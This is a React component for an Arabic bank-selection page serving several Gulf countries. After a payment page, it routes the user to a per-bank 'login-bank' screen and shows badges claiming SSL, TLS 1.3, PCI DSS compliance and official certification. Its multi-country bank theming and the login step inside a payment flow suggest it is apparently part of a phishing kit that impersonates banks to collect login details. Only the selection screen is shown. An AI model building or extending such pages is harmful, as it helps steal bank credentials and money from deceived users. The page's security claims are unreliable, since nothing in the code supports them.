import { useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { getCountryTheme } from '../utils/gulfThemes';

const BankSelect = () => {
  const { country } = useParams<{ country: string }>();
  const navigate = useNavigate();
  const [selectedBank, setSelectedBank] = useState('');
  const theme = getCountryTheme(country || 'uae');

  const handleContinue = () => {
    if (!selectedBank) {
      alert('الرجاء اختيار البنك');
      return;
    }

    sessionStorage.setItem('selectedBank', selectedBank);
    navigate(`/gulf/${country}/login-bank/${selectedBank}`);
  };

  return (
    <div className="min-h-screen" dir="rtl" style={{ backgroundColor: theme.colors.background, fontFamily: theme.fontAr }}>
      {/* Header */}
      <div className="w-full shadow-lg" style={{ background: theme.gradient.primary }}>
        <div className="container mx-auto px-6 py-6">
          <div className="flex items-center justify-between">
            <button
              onClick={() => navigate(`/gulf/${country}/payment`)}
              className="text-white hover:underline"
            >
              ← العودة
            </button>
            <div className="flex items-center gap-4">
              <div className="text-5xl">{theme.flag}</div>
              <div className="text-center">
                <h1 className="text-3xl font-bold text-white mb-1">{theme.nameAr}</h1>
                <p className="text-white opacity-90">اختيار البنك</p>
              </div>
            </div>
            <div className="w-20"></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-6 py-12">
        <div className="max-w-4xl mx-auto">
          {/* Title */}
          <div className="text-center mb-8">
            <h2 className="text-3xl font-bold mb-2" style={{ color: theme.colors.text }}>
              اختر البنك الذي تريد التحويل إليه
            </h2>
            <p className="text-lg" style={{ color: theme.colors.textLight }}>
              جميع البنوك المدعومة حاصلة على ترخيص رسمي
            </p>
          </div>

          {/* Banks Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
            {theme.bankLogos.map((bank) => (
              <div
                key={bank.id}
                onClick={() => setSelectedBank(bank.id)}
                className={`p-6 rounded-lg cursor-pointer transition-all duration-300 transform hover:scale-105 ${
                  selectedBank === bank.id ? 'ring-4' : ''
                }`}
                style={{
                  backgroundColor: selectedBank === bank.id ? theme.colors.surface : theme.colors.background,
                  borderColor: selectedBank === bank.id ? theme.colors.primary : theme.colors.border,
                  borderWidth: '2px',
                  boxShadow: selectedBank === bank.id ? theme.shadows.lg : theme.shadows.md
                }}
              >
                <div className="text-center">
                  {/* Bank Logo Placeholder */}
                  <div
                    className="w-24 h-24 mx-auto rounded-full flex items-center justify-center mb-4"
                    style={{ backgroundColor: theme.colors.surface }}
                  >
                    <svg className="w-12 h-12" style={{ color: theme.colors.primary }} fill="currentColor" viewBox="0 0 20 20">
                      <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zM18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" />
                    </svg>
                  </div>
                  <h3 className="font-bold text-lg mb-2" style={{ color: theme.colors.text }}>
                    {bank.nameAr}
                  </h3>
                  <p className="text-sm" style={{ color: theme.colors.textLight }}>
                    {bank.name}
                  </p>
                  {selectedBank === bank.id && (
                    <div className="mt-4 flex items-center justify-center gap-2" style={{ color: theme.colors.success }}>
                      <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                      </svg>
                      <span className="font-semibold">تم الاختيار</span>
                    </div>
                  )}
                </div>
              </div>
            ))}
          </div>

          {/* Continue Button */}
          <button
            onClick={handleContinue}
            disabled={!selectedBank}
            className={`w-full py-4 text-xl font-bold text-white rounded-lg ${selectedBank ? theme.buttonStyle.primary : 'opacity-50 cursor-not-allowed'}`}
          >
            متابعة للدفع
          </button>

          {/* Security Notice */}
          <div className="mt-8 p-6 rounded-lg" style={{ backgroundColor: theme.colors.surface }}>
            <div className="flex items-start gap-4">
              <svg className="w-8 h-8 flex-shrink-0" style={{ color: theme.colors.success }} fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              <div>
                <h3 className="font-bold text-lg mb-2" style={{ color: theme.colors.text }}>
                  دفع آمن ومشفر 256-bit SSL
                </h3>
                <p className="text-sm" style={{ color: theme.colors.textLight }}>
                  جميع المعاملات محمية بأعلى معايير الأمان العالمية
                </p>
                <div className="flex items-center gap-4 mt-3 text-xs" style={{ color: theme.colors.textLight }}>
                  <span>✓ معتمد رسمياً</span>
                  <span>✓ مشفر بتقنية TLS 1.3</span>
                  <span>✓ متوافق مع PCI DSS</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BankSelect;
